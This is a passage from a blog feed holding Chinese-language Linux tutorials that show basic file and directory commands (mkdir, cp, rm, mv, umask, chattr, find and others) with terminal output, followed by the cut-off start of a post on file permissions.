id="（2）显示当前所在目录：pwd命令"><a href="#（2）显示当前所在目录：pwd命令" class="headerlink" title="（2）显示当前所在目录：pwd命令"></a>（2）显示当前所在目录：pwd命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/www# pwd</span><br><span class="line">/var/www</span><br></pre></td></tr></table></figure><h4 id="（3）建立新目录：mkdir命令"><a href="#（3）建立新目录：mkdir命令" class="headerlink" title="（3）建立新目录：mkdir命令"></a>（3）建立新目录：mkdir命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# mkdir test</span><br><span class="line">root@ubuntu:/tmp# ls -dl test</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# mkdir -p test1/test2/test3/test4 #-p代表递归建立目录</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# mkdir -m 711 test2 #-m代表指定目录权限</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br></pre></td></tr></table></figure><h4 id="（4）删除目录：rmdir命令"><a href="#（4）删除目录：rmdir命令" class="headerlink" title="（4）删除目录：rmdir命令"></a>（4）删除目录：rmdir命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# rmdir test</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rmdir test1</span><br><span class="line">rmdir: failed to remove `test1&apos;: Directory not empty #test1目录尚有内容，无法删除</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rmdir -p test1/test2/test3/test4 #-p连通上层目录一起删除</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br></pre></td></tr></table></figure><h2 id="二-文件与目录管理"><a href="#二-文件与目录管理" class="headerlink" title="二.文件与目录管理"></a>二.文件与目录管理</h2><h3 id="1-文件与目录的查看：ls命令"><a href="#1-文件与目录的查看：ls命令" class="headerlink" title="1.文件与目录的查看：ls命令"></a>1.文件与目录的查看：ls命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -a 显示全部文件，包括隐藏文件</span><br><span class="line">ls -d 仅列出目录本身，而不是列出目录内的文件数据</span><br><span class="line">ls -l 详细信息显示，包括文件的属性与权限等数据</span><br></pre></td></tr></table></figure><h3 id="2-文件或目录的复制命令：cp命令"><a href="#2-文件或目录的复制命令：cp命令" class="headerlink" title="2.文件或目录的复制命令：cp命令"></a>2.文件或目录的复制命令：cp命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cp .bashrc /tmp/test/bashrc</span><br><span class="line">root@ubuntu:~# ls /tmp/test</span><br><span class="line">bashrc</span><br><span class="line">root@ubuntu:~# cp -i .bashrc /tmp/test/bashrc #-i：若目标文件以及存在时，在覆盖时会先询问操作的进行</span><br><span class="line">cp: overwrite `/tmp/test/bashrc&apos;? y</span><br><span class="line"></span><br><span class="line">root@ubuntu:~# cp -a .bashrc /tmp/test/bashrc2 #-a：连同文件属性也一起复制过去</span><br><span class="line">root@ubuntu:~# ls -l /tmp/test/bashrc2 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr 19  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr 19  2012 /tmp/test/bashrc2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 06:07 test</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 18:11 test1</span><br><span class="line">root@ubuntu:/tmp# ls test1</span><br><span class="line">root@ubuntu:/tmp# cp test test1</span><br><span class="line">cp: omitting directory `test&apos;</span><br><span class="line">root@ubuntu:/tmp# cp -r test test1 #-r：如果是目录的复制需要加上-r的选项</span><br><span class="line">root@ubuntu:/tmp# ls test1</span><br><span class="line">test</span><br><span class="line">root@ubuntu:/tmp# ls test1/test</span><br><span class="line">bashrc  bashrc1  bashrc2</span><br></pre></td></tr></table></figure><h3 id="3-文件或目录的删除命令：rm命令"><a href="#3-文件或目录的删除命令：rm命令" class="headerlink" title="3.文件或目录的删除命令：rm命令"></a>3.文件或目录的删除命令：rm命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# rm test2</span><br><span class="line">rm: cannot remove `test2&apos;: Is a directory</span><br><span class="line">root@ubuntu:/tmp# rm -r test2 #当删除目录时，需要加上-r选项</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 06:07 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 18:12 test1</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rm -ir test #加入-i选项，删除前会询问操作者是否操作，避免误删除</span><br><span class="line">rm: descend into directory `test&apos;? ^C #按下[ctrl]+c中断删除操作</span><br></pre></td></tr></table></figure><h3 id="4-移动文件或目录命令或重命名：mv命令"><a href="#4-移动文件或目录命令或重命名：mv命令" class="headerlink" title="4.移动文件或目录命令或重命名：mv命令"></a>4.移动文件或目录命令或重命名：mv命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# mkdir mvtest</span><br><span class="line">root@ubuntu:~/tmp# cp ~/.bashrc bashrc</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">bashrc  mvtest</span><br><span class="line">root@ubuntu:~/tmp# mv bashrc mvtest #将bashrc文件移动到mvtest目录下</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest  mvtest2</span><br><span class="line">root@ubuntu:~/tmp# mv mvtest mvtest2 #将mvtest目录移动到mvtest2目录下</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest2</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest2</span><br><span class="line">mvtest</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# mv mvtest2 mvtest1 #将mvtest2目录重命名为mvtest1目录</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest1</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest1/</span><br><span class="line">mvtest</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest1/mvtest/</span><br><span class="line">bashrc</span><br></pre></td></tr></table></figure><h3 id="5-获取路径的文件名与目录名称：basename命令和dirname命令"><a href="#5-获取路径的文件名与目录名称：basename命令和dirname命令" class="headerlink" title="5.获取路径的文件名与目录名称：basename命令和dirname命令"></a>5.获取路径的文件名与目录名称：basename命令和dirname命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# basename /etc/sysconfig/network</span><br><span class="line">network #获取最后的文件名</span><br><span class="line">root@ubuntu:~# dirname /etc/sysconfig/network</span><br><span class="line">/etc/sysconfig #获取目录名</span><br></pre></td></tr></table></figure><h2 id="三-文件内容查看"><a href="#三-文件内容查看" class="headerlink" title="三.文件内容查看"></a>三.文件内容查看</h2><h3 id="1-直接查看文件内容：cat，tac，nl命令"><a href="#1-直接查看文件内容：cat，tac，nl命令" class="headerlink" title="1.直接查看文件内容：cat，tac，nl命令"></a>1.直接查看文件内容：cat，tac，nl命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cat /etc/passwd #从第一行开始显示文件内容</span><br><span class="line">root@ubuntu:~# tac /etc/passwd #从最后一行开始显示文件内容</span><br><span class="line">root@ubuntu:~# nl /etc/passwd  #在文件内容前加上行号</span><br></pre></td></tr></table></figure><h3 id="2-可翻页查看：more，less命令"><a href="#2-可翻页查看：more，less命令" class="headerlink" title="2.可翻页查看：more，less命令"></a>2.可翻页查看：more，less命令</h3><p>cat命令是将文件内容一次性显示出来，没有一页一页翻动的功能，而<strong>more</strong>和<strong>less</strong>命令具有一页一页翻动的功能</p><p>在more命令按以下键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格键（space）：代表向下翻一页</span><br><span class="line">Enter：代表向下翻一行</span><br><span class="line">b或[ctrl]-b：代表往回翻页</span><br><span class="line">q：代表立刻离开more，不再显示该文件内容</span><br></pre></td></tr></table></figure><p>在less命令按以下键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格键：向下翻动一页</span><br><span class="line">[pagedown]：向下翻动一行</span><br><span class="line">[pageup]：向上翻动一行</span><br><span class="line">q：离开less程序</span><br></pre></td></tr></table></figure><h3 id="3-数据截取：head，tail命令"><a href="#3-数据截取：head，tail命令" class="headerlink" title="3.数据截取：head，tail命令"></a>3.数据截取：head，tail命令</h3><p><strong>head</strong>命令能取出一个文件的前几行，<strong>tail</strong>则是取出文件的后几行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">head [-n number] 文件</span><br><span class="line">root@ubuntu:~# head /etc/manpath.config #默认显示前十行</span><br><span class="line">root@ubuntu:~# head -n 20 /etc/manpath.config #显示前二十行</span><br><span class="line">root@ubuntu:~# head -n -100 /etc/manpath.config #后一百行不会显示出来</span><br><span class="line"></span><br><span class="line">tail [-n number]文件</span><br><span class="line">root@ubuntu:~# tail /etc/manpath.config #默认显示最后十行</span><br><span class="line">root@ubuntu:~# tail -n 20 /etc/manpath.config #显示最后二十行</span><br><span class="line">root@ubuntu:~# tail -n +100 /etc/manpath.config #后一百行显示出来</span><br></pre></td></tr></table></figure><h3 id="4-非纯文本文件读取：od命令"><a href="#4-非纯文本文件读取：od命令" class="headerlink" title="4.非纯文本文件读取：od命令"></a>4.非纯文本文件读取：od命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">od [-t TYPE] 文件</span><br><span class="line">可读取二进制等文件</span><br></pre></td></tr></table></figure><h3 id="5-创建文件：touch命令"><a href="#5-创建文件：touch命令" class="headerlink" title="5.创建文件：touch命令"></a>5.创建文件：touch命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch 文件名</span><br></pre></td></tr></table></figure><h2 id="四-文件默认权限：umask"><a href="#四-文件默认权限：umask" class="headerlink" title="四.文件默认权限：umask"></a>四.文件默认权限：umask</h2><p>当我们建立一个新的文件或目录时，它的默认权限与<code>umask</code>有关，它指定了目前用户在建立文件或目录时候的权限默认值，得知<code>umask</code>的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# umask</span><br><span class="line">0022</span><br><span class="line">root@ubuntu:~/tmp# umask -S</span><br><span class="line">u=rwx,g=rx,o=rx</span><br></pre></td></tr></table></figure><p>查看的方式有两种，一种可以直接输入<code>umask</code>，就可以看到数字类型的权限设置值，另一种则是加入<code>-S</code>这个选项，就会以符号类型的方式来显示出权限了</p><p>但是要注意的是，这里umask的值并不直接是文件或目录的默认权限值，它规定的是是默认值需要减掉的权限，文件的默认权限值为：<code>-rw-rw-rw-</code>，即<code>666</code>；目录的默认权限值为<code>drwxrwxrwx</code>，即<code>777</code>，再减去umask指定的值，那么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">建立文件时：(-rw-rw-rw-) - (-----w--w-) ==&gt; -rw-r--r--</span><br><span class="line">建立目录时：(drwxrwxrwx) - (d----w--w-) ==&gt; drwxr-xr-x</span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# touch test1</span><br><span class="line">root@ubuntu:~/tmp# mkdir test2</span><br><span class="line">root@ubuntu:~/tmp# ls -dl test*</span><br><span class="line">-rw-r--r-- 1 root root    0 Mar 10 06:05 test1</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 10 06:05 test2</span><br></pre></td></tr></table></figure><p>修改umask值的方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# umask 002</span><br><span class="line">root@ubuntu:~/tmp# touch test3</span><br><span class="line">root@ubuntu:~/tmp# mkdir test4</span><br><span class="line">root@ubuntu:~/tmp# ls -dl test[34]</span><br><span class="line">-rw-rw-r-- 1 root root    0 Mar 10 06:16 test3</span><br><span class="line">drwxrwxr-x 2 root root 4096 Mar 10 06:16 test4</span><br></pre></td></tr></table></figure><h2 id="五-文件隐藏属性"><a href="#五-文件隐藏属性" class="headerlink" title="五.文件隐藏属性"></a>五.文件隐藏属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">A  ：当设定了 A 这个属性时，若你有存取此档案(或目录)时，他的访问时间 atime</span><br><span class="line">     将不会被修改，可避免I/O较慢的机器过度的存取磁盘。这对速度较慢的计算机有帮助</span><br><span class="line">S  ：一般档案是异步写入磁盘的(原理请参考第五章sync的说明)，如果加上 S 这个</span><br><span class="line">     属性时，当你进行任何档案的修改，该更动会『同步』写入磁盘中。</span><br><span class="line">a  ：当设定 a 之后，这个档案将只能增加数据，而不能删除也不能修改数据，只有root </span><br><span class="line">     才能设定这个属性。 </span><br><span class="line">c  ：这个属性设定之后，将会自动的将此档案『压缩』，在读取的时候将会自动解压缩，</span><br><span class="line">     但是在储存的时候，将会先进行压缩后再储存(看来对于大档案似乎蛮有用的！)</span><br><span class="line">d  ：当 dump 程序被执行的时候，设定 d 属性将可使该档案(或目录)不会被 dump 备份</span><br><span class="line">i  ：这个 i 可就很厉害了！他可以让一个档案『不能被删除、改名、设定连结也无法</span><br><span class="line">     写入或新增资料！』对于系统安全性有相当大的帮助！只有 root 能设定此属性</span><br><span class="line">s  ：当档案设定了 s 属性时，如果这个档案被删除，他将会被完全的移除出这个硬盘</span><br><span class="line">     空间，所以如果误删了，完全无法救回来了喔！</span><br><span class="line">u  ：与 s 相反的，当使用 u 来配置文件案时，如果该档案被删除了，则数据内容其实还</span><br><span class="line">     存在磁盘中，可以使用来救援该档案喔！</span><br></pre></td></tr></table></figure><h3 id="1-设置文件隐藏属性：chattr命令"><a href="#1-设置文件隐藏属性：chattr命令" class="headerlink" title="1.设置文件隐藏属性：chattr命令"></a>1.设置文件隐藏属性：chattr命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chattr [+-=][ASacdistu] 档案或目录名称</span><br><span class="line">选项与参数：</span><br><span class="line">+   ：增加某一个特殊参数，其他原本存在参数则不动。</span><br><span class="line">-   ：移除某一个特殊参数，其他原本存在参数则不动。</span><br><span class="line">=   ：设定一定，且仅有后面接的参数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# chattr +i test3</span><br><span class="line">root@ubuntu:~/tmp# rm test3</span><br><span class="line">rm: cannot remove `test3&apos;: Operation not permitted</span><br></pre></td></tr></table></figure><p>由于对文件test3附加了<code>i</code>的隐藏属性，所以无法删除</p><h3 id="2-显示文件隐藏属性：lsattr命令"><a href="#2-显示文件隐藏属性：lsattr命令" class="headerlink" title="2.显示文件隐藏属性：lsattr命令"></a>2.显示文件隐藏属性：lsattr命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsattr [-adR] 档案或目录</span><br><span class="line">选项与参数：</span><br><span class="line">-a ：将隐藏文件的属性也秀出来；</span><br><span class="line">-d ：如果接的是目录，仅列出目录本身的属性而非目录内的文件名；</span><br><span class="line">-R ：连同子目录的数据也一并列出来！</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# lsattr test3</span><br><span class="line">----i--------e- test3</span><br></pre></td></tr></table></figure><h2 id="六-观察文件类型：file命令"><a href="#六-观察文件类型：file命令" class="headerlink" title="六.观察文件类型：file命令"></a>六.观察文件类型：file命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# file ~/.bashrc </span><br><span class="line">/root/.bashrc: ASCII English text</span><br><span class="line">root@ubuntu:~/tmp# file /usr/bin/passwd</span><br><span class="line">/usr/bin/passwd: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xc101d30ff4513f2dbad17fcc483dcda4a38e1df0, stripped</span><br></pre></td></tr></table></figure><h2 id="七-命令与文件的查找"><a href="#七-命令与文件的查找" class="headerlink" title="七.命令与文件的查找"></a>七.命令与文件的查找</h2><h3 id="1-脚本文件的查找：which命令"><a href="#1-脚本文件的查找：which命令" class="headerlink" title="1.脚本文件的查找：which命令"></a>1.脚本文件的查找：which命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">which [-a] command</span><br><span class="line">选项与参数：</span><br><span class="line">-a：将所有由PATH目录中科院找到的命令均列出，而不止第一个被找到的命令名称</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# which passwd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">root@ubuntu:~/tmp# which ls</span><br><span class="line">/bin/ls</span><br><span class="line">root@ubuntu:~/tmp# which cd</span><br></pre></td></tr></table></figure><p>可以发现有的命令是找不到的，因为which是默认找<strong>PATH内所规范的路径，去查找执行文件的文件名</strong></p><h3 id="2-文件的查找：whereis，locate-updatedb，find命令"><a href="#2-文件的查找：whereis，locate-updatedb，find命令" class="headerlink" title="2.文件的查找：whereis，locate/updatedb，find命令"></a>2.文件的查找：whereis，locate/updatedb，find命令</h3><p><code>whereis</code>由一些特定的目录查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whereis [-bmsu] 文件或目录名</span><br><span class="line"> </span><br><span class="line">-b 　只查找二进制文件。</span><br><span class="line">-B&lt;目录&gt; 　只在设置的目录下查找二进制文件。</span><br><span class="line">-f 　不显示文件名前的路径名称。</span><br><span class="line">-m 　只查找说明文件。</span><br><span class="line">-M&lt;目录&gt; 　只在设置的目录下查找说明文件。</span><br><span class="line">-s 　只查找原始代码文件。</span><br><span class="line">-S&lt;目录&gt; 　只在设置的目录下查找原始代码文件。</span><br><span class="line">-u 　查找不包含指定类型的文件。</span><br></pre></td></tr></table></figure><p><code>locate</code>是在已建立的数据库<strong>/var/lib/mlocate</strong>里面的数据所查找到的，不用再去硬盘当中读取数据，所以较为快速，数据库默认一天更新一次，如果要手动更新数据库，需要输入<code>updatedb</code>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">locate [-ir] keyword</span><br><span class="line"></span><br><span class="line">-i：忽略大小写的差异</span><br><span class="line">-l：仅输出几行的意思</span><br></pre></td></tr></table></figure><p><code>find</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# find /var -mtime +4 #+4代表大于等于5天前的文件</span><br><span class="line">root@ubuntu:~/tmp# find /var -mtime -4 #-4代表小于等于4天内的文件</span><br><span class="line">root@ubuntu:~/tmp# find /var -mtime 4  #4-5那一天的文件</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Linux
    
    </summary>
    
      <category term="Linux" scheme="https://Foxgrin.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://Foxgrin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux的文件权限与目录配置</title>
    <link href="https://Foxgrin.github.io//posts/26833/"/>
    <id>https://Foxgrin.github.io//posts/26833/</id>
    <published>2019-03-06T10:16:00.000Z</published>
    <updated>2019-03-14T12:00:06.873Z</updated>
    
    <content type="html"><![CDATA[<p>Linux一般将文件可读写的身份分为3个类别，分别是拥有者（owner），所属群组（group），其他人（others），且三种身份各有读（read），写（write），执行（execute）等权限。<a id="more"></a></p><h2 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h2><h3 id="1-文件拥有者"><a href="#1-文件拥有者" class="headerlink" title="1.文件拥有者"></a>1.文件拥有者</h3><p>即用户，通常分为<strong>root</strong>和一般身份的用户，所有用户的相关信息都记录在<strong>/etc/passwd</strong>这个文件内，用户的密码则是记录在<strong>etc/shadow</strong>文件中</p><h3 id="2-用户组"><a href="#2-用户组" class="headerlink" title="2.用户组"></a>2.用户组</h3><p>用户组中有若干用户，组名记录在<strong>/etc/group</strong>文件中</p><h3 id="3-其他人"><a href="#3-其他人" class="headerlink" title="3.其他人"></a>3.其他人</h3><h2 id="Linux文件权限概念"><a href="#Linux文件权限概念" class="headerlink" title="Linux文件权限概念"></a>Linux文件权限概念</h2><h3 id="1-Linux文件属性"><a href="#1-Linux文件属性" class="headerlink" title="1.Linux文件属性"></a>1.Linux文件属性</h3><p>使用<code>ls -al</code>命令查看当前目录下的所有文件（包括以<code>.</code>开头的隐藏文件）和目录及其相关属性与权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ls -al</span><br><span class="line">total 64</span><br><span class="line">drwx------ 11 root root 4096 Mar  5 19:43 .</span><br><span class="line">drwxr-xr-x 24 root root 4096 Apr  8  2018 ..</span><br><span class="line">-rw-------  1 root root  391 Mar  5 22:59 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Apr  8  2018 .cache</span><br><span class="line">drwx------  6 root root 4096 Apr  8  2018 .config</span><br><span class="line">drwx------  3 root root 4096 Dec 30 00:28 .dbus</span><br><span class="line">drwx------  2 root root 4096 Apr 23  2018 .gconf</span><br><span class="line">drwx------  2 root root 4096 Apr  8  2018 .gvfs</span><br><span class="line">drwxr-xr-x  3 root root 4096 Apr  8  2018 .local</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 15  2018 .oracle_jre_usage</span><br><span class="line">-rw-r--r--  1 root root  140 Apr 19  2012 .profile</span><br><span class="line">drwx------  2 root root 4096 Dec 29 22:32 .pulse</span><br><span class="line">-rw-------  1 root root  256 Apr  8  2018 .pulse-cookie</span><br><span class="line">drwxr-xr-x  3 root root 4096 May 15  2018 .swt</span><br><span class="line">-rw-------  1 root root  858 Mar  5 19:43 .viminfo</span><br></pre></td></tr></table></figure><p>以<strong>.config</strong>文件为例说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drwx------    6    root  root  4096  Apr  8  2018 .config</span><br><span class="line">[    1    ]  [2]   [3]   [4]   [5]   [    6    ]   [  7  ]</span><br></pre></td></tr></table></figure><p>信息分为7栏，每栏的意义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[1]：文件类型权限</span><br><span class="line">[2]：链接数</span><br><span class="line">[3]：文件拥有者</span><br><span class="line">[4]：文件所属用户组</span><br><span class="line">[5]：文件大小</span><br><span class="line">[6]：文件最后被修改的时间</span><br><span class="line">[7]：文件名</span><br></pre></td></tr></table></figure><h4 id="第一栏：文件类型权限"><a href="#第一栏：文件类型权限" class="headerlink" 